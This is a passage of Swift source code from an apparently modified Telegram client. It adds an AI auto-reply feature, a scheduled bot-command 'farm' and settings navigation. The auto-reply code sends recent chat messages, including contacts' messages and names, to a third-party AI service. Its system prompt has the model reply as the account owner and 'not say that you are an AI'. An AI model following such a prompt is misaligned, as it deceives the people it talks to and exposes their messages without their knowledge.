import Foundation
import UIKit
import Display
import AccountContext
import SwiftSignalKit
import Postbox
import TelegramCore
import TelegramUIPreferences
import SettingsUI
import PeerInfoStoryGridScreen
import CallListUI
import PassportUI
import AccountUtils
import OverlayStatusController
import PremiumUI
import TelegramPresentationData
import PresentationDataUtils
import PasswordSetupUI
import InstantPageCache
import ItemListUI
import AlertUI
import GlassBackgroundComponent
import TranslateUI
private let eahatGramPersistedChainVisualizationState = Atomic<EahatGramGiftChainVisualizationState?>(value: nil)

private func eahatGramInputTitle(_ presentationData: ItemListPresentationData, _ text: String) -> NSAttributedString {
    return NSAttributedString(string: text, textColor: presentationData.theme.list.itemPrimaryTextColor)
}

private func eahatGramNormalizedNumericText(_ value: String, maxLength: Int) -> String {
    let filtered = value.filter(\.isNumber)
    if filtered.count <= maxLength {
        return filtered
    } else {
        return String(filtered.prefix(maxLength))
    }
}

private func eahatGramPositiveInt(_ value: String, defaultValue: Int, minValue: Int, maxValue: Int) -> Int {
    guard let parsed = Int(value), parsed >= minValue else {
        return defaultValue
    }
    return min(maxValue, parsed)
}

private func eahatGramPeerIdFromText(_ value: String) -> EnginePeer.Id? {
    let normalized = eahatGramNormalizedNumericText(value, maxLength: 18)
    guard let parsed = Int64(normalized), parsed > 0 else {
        return nil
    }
    return EnginePeer.Id(namespace: Namespaces.Peer.CloudUser, id: EnginePeer.Id.Id._internalFromInt64Value(parsed))
}

private struct EahatGramAutoReplyMessage: Codable {
    let role: String
    let content: String
}

private struct EahatGramAutoReplyRequest: Encodable {
    let model: String
    let messages: [EahatGramAutoReplyMessage]
    let temperature: Double
    let max_tokens: Int
}

private struct EahatGramAutoReplyResponse: Decodable {
    struct Choice: Decodable {
        struct Message: Decodable {
            let content: String
        }

        let message: Message
    }

    let choices: [Choice]
}

private enum EahatGramAutoReplyResult {
    case success(String)
    case failure
}

private func eahatGramAutoReplyMessageKey(_ messageId: MessageId) -> String {
    return "\(messageId.peerId.toInt64()):\(messageId.namespace):\(messageId.id)"
}

@discardableResult
private func eahatGramRequestAutoReply(messages: [EahatGramAutoReplyMessage], completion: @escaping (EahatGramAutoReplyResult) -> Void) -> URLSessionDataTask? {
    guard let url = URL(string: "https://text.pollinations.ai/openai") else {
        completion(.failure)
        return nil
    }

    var request = URLRequest(url: url)
    request.httpMethod = "POST"
    request.setValue("application/json", forHTTPHeaderField: "Content-Type")
    request.setValue("application/json", forHTTPHeaderField: "Accept")

    let body = EahatGramAutoReplyRequest(
        model: "openai-fast",
        messages: messages,
        temperature: 0.35,
        max_tokens: 120
    )

    do {
        request.httpBody = try JSONEncoder().encode(body)
    } catch {
        completion(.failure)
        return nil
    }

    let task = URLSession.shared.dataTask(with: request) { data, response, error in
        if error != nil {
            completion(.failure)
            return
        }
        guard let httpResponse = response as? HTTPURLResponse, (200 ..< 300).contains(httpResponse.statusCode), let data else {
            completion(.failure)
            return
        }
        do {
            let decoded = try JSONDecoder().decode(EahatGramAutoReplyResponse.self, from: data)
            let text = decoded.choices.first?.message.content.trimmingCharacters(in: .whitespacesAndNewlines) ?? ""
            if text.isEmpty {
                completion(.failure)
            } else {
                completion(.success(text))
            }
        } catch {
            completion(.failure)
        }
    }
    task.resume()
    return task
}

private func eahatGramAutoReplyMessages(view: MessageHistoryView, replyMessage: Message, accountPeerId: EnginePeer.Id) -> [EahatGramAutoReplyMessage] {
    var result: [EahatGramAutoReplyMessage] = [
        EahatGramAutoReplyMessage(role: "system", content: "You are writing the next Telegram reply as the account owner. Use the recent chat messages as context and answer only the last [other] message. Output only the reply text. Do not say that you are an AI. Do not start with a greeting unless the last incoming message is a greeting. Do not use generic canned greetings unless that is exactly the needed reply. Match the language, slang, capitalization, and tone of the last incoming message. Keep the answer natural, specific, and short. If the context does not contain the needed fact, ask one short clarifying question instead of inventing details. Do not repeat earlier [me] messages.")
    ]

    var contextMessages: [Message] = []
    for entry in view.entries {
        let message = entry.message
        guard message.id.namespace == Namespaces.Message.Cloud else {
            continue
        }
        guard message.index <= replyMessage.index else {
            continue
        }
        let text = message.text.trimmingCharacters(in: .whitespacesAndNewlines)
        guard !text.isEmpty else {
            continue
        }
        contextMessages.append(message)
    }

    contextMessages.sort(by: { $0.index < $1.index })
    if contextMessages.count > 14 {
        contextMessages = Array(contextMessages.suffix(14))
    }

    var transcriptLines: [String] = []
    for message in contextMessages {
        let isIncoming = message.effectivelyIncoming(accountPeerId)
        let text = message.text.trimmingCharacters(in: .whitespacesAndNewlines)
        let marker: String
        if isIncoming, let author = message.author {
            marker = "other \(author.compactDisplayTitle)"
        } else if isIncoming {
            marker = "other"
        } else {
            marker = "me"
        }
        transcriptLines.append("[\(marker)] \(text)")
    }

    if !transcriptLines.isEmpty {
        result.append(EahatGramAutoReplyMessage(role: "user", content: "Recent Telegram chat transcript:\n\(transcriptLines.joined(separator: "\n"))\n\nWrite my next reply to the last [other] message."))
    }

    return result
}

public final class EahatGramAiAutoReplyManager {
    public static let shared = EahatGramAiAutoReplyManager()

    private let queue = Queue.mainQueue()
    private let historyDisposable = MetaDisposable()
    private weak var primaryContext: AccountContext?
    private var observedPeerId: EnginePeer.Id?
    private var observedAccountPeerId: EnginePeer.Id?
    private var latestObservedIndex: MessageIndex?
    private var hasLoadedInitialHistory = false
    private var handledMessageIds = Set<String>()

    private init() {
    }

    public func updatePrimaryContext(_ context: AccountContext?) {
        self.queue.async {
            self.primaryContext = context
            self.refreshSubscription()
        }
    }

    public func refresh() {
        self.queue.async {
            self.refreshSubscription()
        }
    }

    private func clearSubscription() {
        self.historyDisposable.set(nil)
        self.observedPeerId = nil
        self.observedAccountPeerId = nil
        self.latestObservedIndex = nil
        self.hasLoadedInitialHistory = false
    }

    private func refreshSubscription() {
        guard let context = self.primaryContext else {
            self.clearSubscription()
            return
        }

        let settings = context.sharedContext.immediateExperimentalUISettings
        guard settings.eahatGramAiAssistantEnabled, let configuredPeerId = settings.eahatGramAiAssistantChatPeerId else {
            self.clearSubscription()
            return
        }

        let peerId = EnginePeer.Id(configuredPeerId)
        if self.observedPeerId == peerId, self.observedAccountPeerId == context.account.peerId {
            return
        }

        self.observedPeerId = peerId
        self.observedAccountPeerId = context.account.peerId
        self.latestObservedIndex = nil
        self.hasLoadedInitialHistory = false
        self.historyDisposable.set((context.account.viewTracker.aroundMessageHistoryViewForLocation(.peer(peerId: peerId, threadId: nil), index: .upperBound, anchorIndex: .upperBound, count: 20, fixedCombinedReadStates: nil)
        |> deliverOnMainQueue).start(next: { [weak self, weak context] view, _, _ in
            guard let self, let context else {
                return
            }
            self.processHistoryView(view, peerId: peerId, context: context)
        }))
    }

    private func processHistoryView(_ view: MessageHistoryView, peerId: EnginePeer.Id, context: AccountContext) {
        let settings = context.sharedContext.immediateExperimentalUISettings
        guard settings.eahatGramAiAssistantEnabled, settings.eahatGramAiAssistantChatPeerId == peerId.toInt64() else {
            self.clearSubscription()
            return
        }

        var maxIndex: MessageIndex?
        for entry in view.entries {
            guard entry.message.id.namespace == Namespaces.Message.Cloud else {
                continue
            }
            if let currentMaxIndex = maxIndex {
                if currentMaxIndex < entry.message.index {
                    maxIndex = entry.message.index
                }
            } else {
                maxIndex = entry.message.index
            }
        }

        let previousMaxIndex = self.latestObservedIndex
        if !self.hasLoadedInitialHistory {
            self.hasLoadedInitialHistory = true
            self.latestObservedIndex = maxIndex
            return
        }
        self.latestObservedIndex = maxIndex

        let targetPeerId: Int64?
        if settings.eahatGramAiAssistantTargetPeerEnabled {
            guard let configuredTargetPeerId = settings.eahatGramAiAssistantTargetPeerId else {
                return
            }
            targetPeerId = configuredTargetPeerId
        } else {
            targetPeerId = nil
        }

        for entry in view.entries {
            let message = entry.message
            guard message.id.namespace == Namespaces.Message.Cloud else {
                continue
            }
            if let previousMaxIndex {
                guard previousMaxIndex < message.index else {
                    continue
                }
            }
            guard message.effectivelyIncoming(context.account.peerId) else {
                continue
            }
            if let targetPeerId = targetPeerId {
                guard let authorPeerId = message.author?.id.toInt64(), authorPeerId == targetPeerId else {
                    continue
                }
            }
            let incomingText = message.text.trimmingCharacters(in: .whitespacesAndNewlines)
            guard !incomingText.isEmpty else {
                continue
            }

            let messageKey = eahatGramAutoReplyMessageKey(message.id)
            guard !self.handledMessageIds.contains(messageKey) else {
                continue
            }
            self.handledMessageIds.insert(messageKey)

            let replySubject = EngineMessageReplySubject(messageId: message.id, quote: nil, innerSubject: nil)
            let requestMessages = eahatGramAutoReplyMessages(view: view, replyMessage: message, accountPeerId: context.account.peerId)
            eahatGramRequestAutoReply(messages: requestMessages) { [weak context] result in
                Queue.mainQueue().async {
                    guard let context else {
                        return
                    }
                    guard case let .success(text) = result else {
                        return
                    }
                    let currentSettings = context.sharedContext.immediateExperimentalUISettings
                    guard currentSettings.eahatGramAiAssistantEnabled, currentSettings.eahatGramAiAssistantChatPeerId == peerId.toInt64() else {
                        return
                    }
                    let replyMessage: EnqueueMessage = .message(
                        text: text,
                        attributes: [],
                        inlineStickers: [:],
                        mediaReference: nil,
                        threadId: message.threadId,
                        replyToMessageId: replySubject,
                        replyToStoryId: nil,
                        localGroupingKey: nil,
                        correlationId: nil,
                        bubbleUpEmojiOrStickersets: []
                    )
                    let _ = (enqueueMessages(account: context.account, peerId: peerId, messages: [replyMessage])
                    |> deliverOnMainQueue).start()
                }
            }
        }
    }
}

private func eahatGramBaseTranslationLanguageCode(_ strings: PresentationStrings) -> String {
    var languageCode = strings.baseLanguageCode
    let rawSuffix = "-raw"
    if languageCode.hasSuffix(rawSuffix) {
        languageCode = String(languageCode.dropLast(rawSuffix.count))
    }
    return normalizeTranslationLanguage(languageCode)
}

private func eahatGramTranslationLanguageLabel(_ strings: PresentationStrings, languageCode: String?) -> String {
    let interfaceLanguageCode = normalizeTranslationLanguage(strings.baseLanguageCode)
    let locale = Locale(identifier: interfaceLanguageCode)
    let effectiveLanguageCode = normalizeTranslationLanguage(languageCode ?? eahatGramBaseTranslationLanguageCode(strings))
    return locale.localizedString(forLanguageCode: effectiveLanguageCode) ?? effectiveLanguageCode
}

struct EahatGramFarmJob: Codable, Equatable {
    let id: Int64
    var botUsername: String
    var command: String
    var intervalMinutes: Int32
    var isEnabled: Bool
    var lastTriggeredAt: Int32?
    var lastResultText: String?
}

private func eahatGramNormalizedFarmUsername(_ value: String) -> String {
    return eahatGramNormalizedUsernameTag(value)
}

public final class EahatGramFarmManager {
    public static let shared = EahatGramFarmManager()

    private static let jobsDefaultsKey = "eahatGram.farm.jobs"

    private let queue = Queue.mainQueue()
    private let jobsPromise: ValuePromise<[EahatGramFarmJob]>
    private var jobsValue: [EahatGramFarmJob]
    private var timer: SwiftSignalKit.Timer?
    private weak var primaryContext: AccountContext?
    private var backgroundRefreshUpdater: (() -> Void)?

    private init() {
        let jobsValue = EahatGramFarmManager.loadPersistedJobs()
        self.jobsValue = jobsValue
        self.jobsPromise = ValuePromise(jobsValue, ignoreRepeated: true)
    }

    public func updatePrimaryContext(_ context: AccountContext?) {
        self.queue.async {
            self.primaryContext = context
            self.updateTimer()
            self.backgroundRefreshUpdater?()
        }
    }

    public func updateBackgroundRefreshUpdater(_ updater: (() -> Void)?) {
        self.queue.async {
            self.backgroundRefreshUpdater = updater
            updater?()
        }
    }

    func jobsSignal() -> Signal<[EahatGramFarmJob], NoError> {
        return self.jobsPromise.get()
    }

    func jobsSnapshot() -> [EahatGramFarmJob] {
        return self.jobsValue
    }

    public func nextBackgroundRefreshDate() -> Date? {
        guard self.isBackgroundRefreshEnabled() else {
            return nil
        }
        let now = Int32(Date().timeIntervalSince1970)
        guard let nextDueTimestamp = self.nextDueTimestamp(referenceTimestamp: now) else {
            return nil
        }
        return Date(timeIntervalSince1970: TimeInterval(max(now + 1, nextDueTimestamp)))
    }

    public func hasEnabledJobs() -> Bool {
        return self.jobsValue.contains(where: { $0.isEnabled })
    }

    public func isBackgroundRefreshEnabled() -> Bool {
        guard let primaryContext = self.primaryContext else {
            return false
        }
        return primaryContext.sharedContext.immediateExperimentalUISettings.farmBackgroundEnabled
    }

    public func hasDueJobs(referenceTimestamp: Int32 = Int32(Date().timeIntervalSince1970), leewaySeconds: Int32 = 0) -> Bool {
        guard let nextDueTimestamp = self.nextDueTimestamp(referenceTimestamp: referenceTimestamp) else {
            return false
        }
        return nextDueTimestamp <= referenceTimestamp + max(0, leewaySeconds)
    }

    public func refreshBackgroundScheduling() {
        self.queue.async {
            self.backgroundRefreshUpdater?()
        }
    }

    public func processDueJobsNow(context: AccountContext, completion: (() -> Void)? = nil) {
        self.queue.async {
            self.processDueJobs(context: context, completion: completion)
        }
    }

    func addJob(botUsername: String, command: String, intervalMinutes: Int32) {
        self.queue.async {
            let normalizedBotUsername = eahatGramNormalizedFarmUsername(botUsername)
            let normalizedCommand = command.trimmingCharacters(in: .whitespacesAndNewlines)
            guard !normalizedBotUsername.isEmpty, !normalizedCommand.isEmpty else {
                return
            }
            let timestamp = Int32(Date().timeIntervalSince1970)
            let job = EahatGramFarmJob(
                id: Int64.random(in: 1 ... Int64.max),
                botUsername: normalizedBotUsername,
                command: normalizedCommand,
                intervalMinutes: max(1, intervalMinutes),
                isEnabled: true,
                lastTriggeredAt: timestamp,
                lastResultText: "scheduled"
            )
            self.jobsValue.append(job)
            self.commitJobs()
        }
    }

    func setJobEnabled(id: Int64, value: Bool) {
        self.queue.async {
            guard let index = self.jobsValue.firstIndex(where: { $0.id == id }) else {
                return
            }
            self.jobsValue[index].isEnabled = value
            self.jobsValue[index].lastResultText = value ? "scheduled" : "disabled"
            if value {
                self.jobsValue[index].lastTriggeredAt = Int32(Date().timeIntervalSince1970)
            }
            self.commitJobs()
        }
    }

    func removeJob(id: Int64) {
        self.queue.async {
            self.jobsValue.removeAll(where: { $0.id == id })
            self.commitJobs()
        }
    }

    private func commitJobs() {
        EahatGramFarmManager.storePersistedJobs(self.jobsValue)
        self.jobsPromise.set(self.jobsValue)
        self.updateTimer()
        self.backgroundRefreshUpdater?()
    }

    private func updateTimer() {
        let shouldRun = self.primaryContext != nil && self.jobsValue.contains(where: { $0.isEnabled })
        if shouldRun {
            if self.timer == nil {
                let timer = SwiftSignalKit.Timer(timeout: 10.0, repeat: true, completion: { [weak self] in
                    self?.processDueJobs()
                }, queue: self.queue)
                self.timer = timer
                timer.start()
            }
            self.processDueJobs()
        } else if let timer = self.timer {
            self.timer = nil
            timer.invalidate()
        }
    }

    private func nextDueTimestamp(referenceTimestamp: Int32) -> Int32? {
        var result: Int32?
        for job in self.jobsValue {
            guard job.isEnabled else {
                continue
            }
            let interval = max(1, job.intervalMinutes) * 60
            let lastTriggeredAt = job.lastTriggeredAt ?? referenceTimestamp
            let dueTimestamp = lastTriggeredAt + interval
            if let current = result {
                result = min(current, dueTimestamp)
            } else {
                result = dueTimestamp
            }
        }
        return result
    }

    private func processDueJobs() {
        guard let context = self.primaryContext else {
            return
        }
        self.processDueJobs(context: context, completion: nil)
    }

    private func processDueJobs(context: AccountContext, completion: (() -> Void)?) {
        let now = Int32(Date().timeIntervalSince1970)
        var dueJobs: [EahatGramFarmJob] = []
        for index in self.jobsValue.indices {
            guard self.jobsValue[index].isEnabled else {
                continue
            }
            let interval = max(1, self.jobsValue[index].intervalMinutes) * 60
            let lastTriggeredAt = self.jobsValue[index].lastTriggeredAt ?? 0
            if now - lastTriggeredAt < interval {
                continue
            }
            let job = self.jobsValue[index]
            self.jobsValue[index].lastTriggeredAt = now
            self.jobsValue[index].lastResultText = "sending"
            dueJobs.append(job)
        }
        if dueJobs.isEmpty {
            completion?()
            return
        }
        self.commitJobs()
        var remainingJobCount = dueJobs.count
        let completeJob: () -> Void = {
            remainingJobCount -= 1
            if remainingJobCount == 0 {
                completion?()
            }
        }
        for job in dueJobs {
            let command = job.command
            let signal = (context.engine.peers.resolvePeerByName(name: job.botUsername, referrer: nil)
            |> filter { result in
                if case .result = result {
                    return true
                } else {
                    return false
                }
            }
            |> take(1)
            |> mapToSignal { result -> Signal<(EnginePeer.Id?, [MessageId?]), NoError> in
                guard case let .result(peer) = result else {
                    return .single((nil, []))
                }
                guard let resolvedPeer = peer else {
                    return .single((nil, []))
                }
                let peerId = resolvedPeer.id
                let message: EnqueueMessage = .message(
                    text: command,
                    attributes: [],
                    inlineStickers: [:],
                    mediaReference: nil,
                    threadId: nil,
                    replyToMessageId: nil,
                    replyToStoryId: nil,
                    localGroupingKey: nil,
                    correlationId: nil,
                    bubbleUpEmojiOrStickersets: []
                )
                return enqueueMessages(account: context.account, peerId: peerId, messages: [message])
                |> map { (peerId, $0) }
            }
            |> deliverOn(self.queue))

            var didComplete = false
            let completeJobIfNeeded: (_ fallbackResultText: String?) -> Void = { [weak self] fallbackResultText in
                guard let self, !didComplete else {
                    return
                }
                didComplete = true
                if let fallbackResultText, let resultIndex = self.jobsValue.firstIndex(where: { $0.id == job.id }), self.jobsValue[resultIndex].lastResultText == "sending" {
                    self.jobsValue[resultIndex].lastResultText = fallbackResultText
                    self.commitJobs()
                }
                completeJob()
            }

            let _ = signal.startStandalone(next: { [weak self] (peerId: EnginePeer.Id?, messageIds: [MessageId?]) in
                guard let self else {
                    return
                }
                guard let resultIndex = self.jobsValue.firstIndex(where: { $0.id == job.id }) else {
                    completeJobIfNeeded(nil)
                    return
                }
                if let peerId {
                    let hasMessageId = messageIds.contains(where: { $0 != nil })
                    self.jobsValue[resultIndex].lastResultText = "sent peerId=\(peerId.toInt64()) messageId=\(hasMessageId ? 1 : 0)"
                } else {
                    self.jobsValue[resultIndex].lastResultText = "resolve_failed"
                }
                self.commitJobs()
                completeJobIfNeeded(nil)
            }, completed: {
                completeJobIfNeeded("resolve_failed")
            })
        }
    }

    private static func loadPersistedJobs() -> [EahatGramFarmJob] {
        guard let data = UserDefaults.standard.data(forKey: self.jobsDefaultsKey),
              let jobs = try? JSONDecoder().decode([EahatGramFarmJob].self, from: data) else {
            return []
        }
        return jobs
    }

    private static func storePersistedJobs(_ jobs: [EahatGramFarmJob]) {
        if jobs.isEmpty {
            UserDefaults.standard.removeObject(forKey: self.jobsDefaultsKey)
        } else if let data = try? JSONEncoder().encode(jobs) {
            UserDefaults.standard.set(data, forKey: self.jobsDefaultsKey)
        }
    }
}

private final class EahatGramItemListController: ItemListController, UIGestureRecognizerDelegate {
    private var dismissKeyboardGesture: UITapGestureRecognizer?

    override func displayNodeDidLoad() {
        super.displayNodeDidLoad()

        let gesture = UITapGestureRecognizer(target: self, action: #selector(self.dismissKeyboardGestureAction(_:)))
        gesture.cancelsTouchesInView = false
        gesture.delegate = self
        self.view.addGestureRecognizer(gesture)
        self.dismissKeyboardGesture = gesture
    }

    @objc private func dismissKeyboardGestureAction(_ gesture: UITapGestureRecognizer) {
        guard gesture.state == .ended else {
            return
        }
        self.view.window?.endEditing(true)
        self.view.endEditing(true)
    }

    func gestureRecognizer(_ gestureRecognizer: UIGestureRecognizer, shouldReceive touch: UITouch) -> Bool {
        var currentView = touch.view
        while let view = currentView {
            if view is UITextField || view is UITextView || view is UISwitch || view is UIButton || view is UISegmentedControl {
                return false
            }
            currentView = view.superview
        }
        return true
    }
}

extension PeerInfoScreenNode {
    func openSettings(section: PeerInfoSettingsSection) {
        let push: (ViewController) -> Void = { [weak self] c in
            guard let strongSelf = self, let navigationController = strongSelf.controller?.navigationController as? NavigationController else {
                return
            }

            if strongSelf.isMyProfile {
                navigationController.pushViewController(c)
            } else {
                var updatedControllers = navigationController.viewControllers
                for controller in navigationController.viewControllers.reversed() {
                    if controller !== strongSelf && !(controller is TabBarController) {
                        updatedControllers.removeLast()
                    } else {
                        break
                    }
                }
                updatedControllers.append(c)

                var animated = true
                if let validLayout = strongSelf.validLayout?.0, case .regular = validLayout.metrics.widthClass {
                    animated = false
                }
                navigationController.setViewControllers(updatedControllers, animated: animated)
            }
        }
        switch section {
        case .avatar:
            self.controller?.openAvatarForEditing()
        case .edit:
            self.headerNode.navigationButtonContainer.performAction?(.edit, nil, nil)
        case .proxy:
            self.controller?.push(proxySettingsController(context: self.context))
        case .profile:
            self.controller?.push(PeerInfoScreenImpl(
                context: self.context,
                updatedPresentationData: self.controller?.updatedPresentationData,
                peerId: self.context.account.peerId,
                avatarInitiallyExpanded: false,
                isOpenedFromChat: false,
                nearbyPeerDistance: nil,
                reactionSourceMessageId: nil,
                callMessages: [],
                isMyProfile: true,
                profileGiftsContext: self.data?.profileGiftsContext
            ))
        case .stories:
            push(PeerInfoStoryGridScreen(context: self.context, peerId: self.context.account.peerId, scope: .saved))
        case .savedMessages:
            let _ = (self.context.engine.data.get(TelegramEngine.EngineData.Item.Peer.Peer(id: self.context.account.peerId))
            |> deliverOnMainQueue).startStandalone(next: { [weak self] peer in
                guard let self, let peer = peer else {
                    return
                }
                if let controller = self.controller, let navigationController = controller.navigationController as? NavigationController {
                    self.context.sharedContext.navigateToChatController(NavigateToChatControllerParams(navigationController: navigationController, context: self.context, chatLocation: .peer(peer)))
                }
            })
        case .recentCalls:
            push(CallListController(context: context, mode: .navigation))
        case .devices:
            let _ = (self.activeSessionsContextAndCount.get()
            |> take(1)
            |> deliverOnMainQueue).startStandalone(next: { [weak self] activeSessionsContextAndCount in
                if let strongSelf = self, let activeSessionsContextAndCount = activeSessionsContextAndCount {
                    let (activeSessionsContext, _, webSessionsContext) = activeSessionsContextAndCount
                    push(recentSessionsController(context: strongSelf.context, activeSessionsContext: activeSessionsContext, webSessionsContext: webSessionsContext, websitesOnly: false))
                }
            })
        case .chatFolders:
            let controller = self.context.sharedContext.makeFilterSettingsController(context: self.context, modal: false, scrollToTags: false, dismissed: nil)
            push(controller)
        case .notificationsAndSounds:
            if let settings = self.data?.globalSettings {
                push(notificationsAndSoundsController(context: self.context, exceptionsList: settings.notificationExceptions))
            }
        case .privacyAndSecurity:
            if let settings = self.data?.globalSettings {
                let _ = (combineLatest(self.blockedPeers.get(), self.hasTwoStepAuth.get())
                |> take(1)
                |> deliverOnMainQueue).startStandalone(next: { [weak self] blockedPeersContext, hasTwoStepAuth in
                    if let strongSelf = self {
                        let loginEmailPattern = strongSelf.twoStepAuthData.get() |> map { data -> String? in
                            return data?.loginEmailPattern
                        }
                        push(privacyAndSecurityController(context: strongSelf.context, initialSettings: settings.privacySettings, updatedSettings: { [weak self] settings in
                            self?.privacySettings.set(.single(settings))
                        }, updatedBlockedPeers: { [weak self] blockedPeersContext in
                            self?.blockedPeers.set(.single(blockedPeersContext))
                        }, updatedHasTwoStepAuth: { [weak self] hasTwoStepAuthValue in
                            self?.hasTwoStepAuth.set(.single(hasTwoStepAuthValue))
                        }, focusOnItemTag: nil, activeSessionsContext: settings.activeSessionsContext, webSessionsContext: settings.webSessionsContext, blockedPeersContext: blockedPeersContext, hasTwoStepAuth: hasTwoStepAuth, loginEmailPattern: loginEmailPattern, updatedTwoStepAuthData: { [weak self] in
                            if let strongSelf = self {
                                strongSelf.twoStepAuthData.set(
                                    strongSelf.context.engine.auth.twoStepAuthData()
                                    |> map(Optional.init)
                                    |> `catch` { _ -> Signal<TwoStepAuthData?, NoError> in
                                        return .single(nil)
                                    }
                                )
                            }
                        }, requestPublicPhotoSetup: { [weak self] completion in
                            if let self {
                                self.controller?.openAvatarForEditing(mode: .fallback, completion: completion)
                            }
                        }, requestPublicPhotoRemove: { [weak self] completion in
                            if let self {
                                self.controller?.openAvatarRemoval(mode: .fallback, completion: completion)
                            }
                        }))
                    }
                })
            }
        case .passwordSetup:
            DispatchQueue.main.asyncAfter(deadline: DispatchTime.now() + 0.6, execute: { [weak self] in
                guard let self else {
                    return
                }
                let _ = self.context.engine.notices.dismissServerProvidedSuggestion(suggestion: ServerProvidedSuggestion.setupPassword.id).startStandalone()
            })

            let controller = self.context.sharedContext.makeSetupTwoFactorAuthController(context: self.context)
            push(controller)
        case .dataAndStorage:
            push(dataAndStorageController(context: self.context))
        case .eahatGram:
            push(eahatGramScreen(context: self.context, starsContext: self.controller?.starsContext, profileGiftsContext: self.data?.profileGiftsContext))
        case .appearance:
            push(themeSettingsController(context: self.context))
        case .language:
            push(LocalizationListController(context: self.context))
        case .premium:
            let controller = self.context.sharedContext.makePremiumIntroController(context: self.context, source: .settings, forceDark: false, dismissed: nil)
            self.controller?.push(controller)
        case .premiumGift:
            guard let controller = self.controller, !controller.presentAccountFrozenInfoIfNeeded() else {
                return
            }
            let _ = (self.context.account.stateManager.contactBirthdays
            |> take(1)
            |> deliverOnMainQueue).start(next: { [weak self] birthdays in
                guard let self else {
                    return
                }
                let giftsController = self.context.sharedContext.makePremiumGiftController(context: self.context, source: .settings(birthdays), completion: nil)
                self.controller?.push(giftsController)
            })
        case .stickers:
            if let settings = self.data?.globalSettings {
                push(installedStickerPacksController(context: self.context, mode: .general, archivedPacks: settings.archivedStickerPacks, updatedPacks: { [weak self] packs in
                    self?.archivedPacks.set(.single(packs))
                }))
            }
        case .passport:
            self.controller?.push(SecureIdAuthController(context: self.context, mode: .list))
        case .watch:
            push(watchSettingsController(context: self.context))
        case .support:
            let supportPeer = Promise<PeerId?>()
            supportPeer.set(context.engine.peers.supportPeerId())

            self.controller?.present(textAlertController(context: self.context, updatedPresentationData: self.controller?.updatedPresentationData, title: nil, text: self.presentationData.strings.Settings_FAQ_Intro, actions: [
                TextAlertAction(type: .genericAction, title: presentationData.strings.Settings_FAQ_Button, action: { [weak self] in
                    self?.openFaq()
                }), TextAlertAction(type: .defaultAction, title: presentationData.strings.Common_OK, action: { [weak self] in
                    guard let self else {
                        return
                    }
                    self.supportPeerDisposable.set((supportPeer.get() |> take(1) |> deliverOnMainQueue).startStrict(next: { [weak self] peerId in
                        if let strongSelf = self, let peerId = peerId {
                            push(strongSelf.context.sharedContext.makeChatController(context: strongSelf.context, chatLocation: .peer(id: peerId), subject: nil, botStart: nil, mode: .standard(.default), params: nil))
                        }
                    }))
                })]), in: .window(.root))
        case .faq:
            self.openFaq()
        case .tips:
            self.openTips()
        case .phoneNumber:
            guard let controller = self.controller, !controller.presentAccountFrozenInfoIfNeeded() else {
                return
            }
            if let user = self.data?.peer as? TelegramUser, let phoneNumber = user.phone {
                let introController = PrivacyIntroController(context: self.context, mode: .changePhoneNumber(phoneNumber), proceedAction: { [weak self] in
                    if let strongSelf = self, let navigationController = strongSelf.controller?.navigationController as? NavigationController {
                        navigationController.replaceTopController(ChangePhoneNumberController(context: strongSelf.context), animated: true)
                    }
                })
                push(introController)
            }
        case .username:
            guard let controller = self.controller, !controller.presentAccountFrozenInfoIfNeeded() else {
                return
            }
            push(usernameSetupController(context: self.context))
        case .addAccount:
            let _ = (activeAccountsAndPeers(context: context)
            |> take(1)
            |> deliverOnMainQueue
            ).startStandalone(next: { [weak self] accountAndPeer, accountsAndPeers in
                guard let strongSelf = self else {
                    return
                }
                var maximumAvailableAccounts: Int = maximumNumberOfAccounts
                if accountAndPeer?.1.isPremium == true && !strongSelf.context.account.testingEnvironment {
                    maximumAvailableAccounts = maximumPremiumNumberOfAccounts
                }
                var count: Int = 1
                for (accountContext, peer, _) in accountsAndPeers {
                    if !accountContext.account.testingEnvironment {
                        if peer.isPremium {
                            maximumAvailableAccounts = maximumPremiumNumberOfAccounts
                        }
                        count += 1
                    }
                }

                if count >= maximumAvailableAccounts {
                    var replaceImpl: ((ViewController) -> Void)?
                    let controller = PremiumLimitScreen(context: strongSelf.context, subject: .accounts, count: Int32(count), action: {
                        let controller = PremiumIntroScreen(context: strongSelf.context, source: .accounts)
                        replaceImpl?(controller)
                        return true
                    })
                    replaceImpl = { [weak controller] c in
                        controller?.replace(with: c)
                    }
                    if let navigationController = strongSelf.context.sharedContext.mainWindow?.viewController as? NavigationController {
                        navigationController.pushViewController(controller)
                    }
                } else {
                    strongSelf.context.sharedContext.beginNewAuth(testingEnvironment: strongSelf.context.account.testingEnvironment)
                }
            })
        case .logout:
            if let user = self.data?.peer as? TelegramUser, let phoneNumber = user.phone {
                if let controller = self.controller, let navigationController = controller.navigationController as? NavigationController {
                    self.controller?.push(logoutOptionsController(context: self.context, navigationController: navigationController, canAddAccounts: true, phoneNumber: phoneNumber))
                }
            }
        case .rememberPassword:
            let context = self.context
            let controller = TwoFactorDataInputScreen(sharedContext: self.context.sharedContext, engine: .authorized(self.context.engine), mode: .rememberPassword(doneText: self.presentationData.strings.TwoFactorSetup_Done_Action), stateUpdated: { _ in
            }, presentation: .modalInLargeLayout)
            controller.twoStepAuthSettingsController = { configuration in
                return twoStepVerificationUnlockSettingsController(context: context, mode: .access(intro: false, data: .single(TwoStepVerificationUnlockSettingsControllerData.access(configuration: TwoStepVerificationAccessConfiguration(configuration: configuration, password: nil)))))
            }
            controller.passwordRemembered = {
                let _ = context.engine.notices.dismissServerProvidedSuggestion(suggestion: ServerProvidedSuggestion.validatePassword.id).startStandalone()
            }
            push(controller)
        case .emojiStatus:
            self.headerNode.invokeDisplayPremiumIntro()
        case .profileColor:
            self.interaction.editingOpenNameColorSetup()
        case .powerSaving:
            push(energySavingSettingsScreen(context: self.context))
        case .businessSetup:
            guard let controller = self.controller, !controller.presentAccountFrozenInfoIfNeeded() else {
                return
            }
            push(self.context.sharedContext.makeBusinessSetupScreen(context: self.context))
        case .premiumManagement:
            guard let controller = self.controller else {
                return
            }
            let premiumConfiguration = PremiumConfiguration.with(appConfiguration: self.context.currentAppConfiguration.with { $0 })
            let url = premiumConfiguration.subscriptionManagementUrl
            guard !url.isEmpty else {
                return
            }
            self.context.sharedContext.openExternalUrl(context: self.context, urlContext: .generic, url: url, forceExternal: !url.hasPrefix("tg://") && !url.contains("?start="), presentationData: self.context.sharedContext.currentPresentationData.with({$0}), navigationController: controller.navigationController as? NavigationController, dismissInput: {})
        case .stars:
            if let starsContext = self.controller?.starsContext {
                push(self.context.sharedContext.makeStarsTransactionsScreen(context: self.context, starsContext: starsContext))
